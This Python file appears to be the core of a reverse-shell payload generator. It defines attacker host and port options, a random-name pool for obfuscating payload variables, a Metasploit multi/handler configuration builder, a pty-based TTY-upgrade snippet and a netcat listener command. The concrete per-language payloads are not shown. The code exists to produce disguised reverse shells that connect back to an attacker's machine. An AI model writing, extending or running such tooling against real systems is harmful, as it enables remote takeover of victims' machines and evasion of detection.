import random
import string
from abc import ABC, abstractmethod
from dataclasses import dataclass, field

_RESERVED = {
    "sh", "bash", "zsh", "nc", "ip", "ls", "cd", "rm", "cp", "mv",
    "ps", "id", "if", "do", "fi", "in", "fd", "io", "os", "cmd",
    "pw", "py", "rb", "go", "fn", "is", "it", "me", "my",
}

TTY_UPGRADE = (
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
    "# then on attacker: Ctrl+Z  →  stty raw -echo; fg  →  reset"
)

LISTENER_FMT = "rlwrap nc -lvnp {lport}"


@dataclass
class ShellOptions:
    lhost: str
    lport: int
    arch: str
    obfuscate: bool
    retry: bool = False
    egress_port: int | None = None

    @property
    def delivery_port(self) -> int:
        return self.egress_port or self.lport

    @property
    def delivery_url(self) -> str:
        return f"http://{self.lhost}:{self.delivery_port}"


@dataclass
class ShellResult:
    command: str
    variant: str
    language: str
    arch: str
    listener: str | None = None
    tty_upgrade: str | None = None
    msf_compat: str | None = None


class RandomNamePool:
    def __init__(self, length_range: tuple[int, int] = (4, 8)):
        self._used: set[str] = set()
        self._length_range = length_range

    def get(self) -> str:
        for _ in range(10_000):
            length = random.randint(*self._length_range)
            name = random.choice(string.ascii_lowercase) + "".join(
                random.choices(string.ascii_lowercase + string.digits, k=length - 1)
            )
            if name not in _RESERVED and name not in self._used:
                self._used.add(name)
                return name
        raise RuntimeError("RandomNamePool exhausted — increase length_range")


def msf_handler(payload: str, lhost: str, lport: int) -> str:
    return (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"run -j"
    )


class ShellGenerator(ABC):
    language: str = ""

    def generate(self, opts: ShellOptions) -> ShellResult:
        names = RandomNamePool() if opts.obfuscate else None
        return self._generate(opts, names)

    @abstractmethod
    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        ...

    def _var(self, default: str, names: RandomNamePool | None) -> str:
        return names.get() if names else default
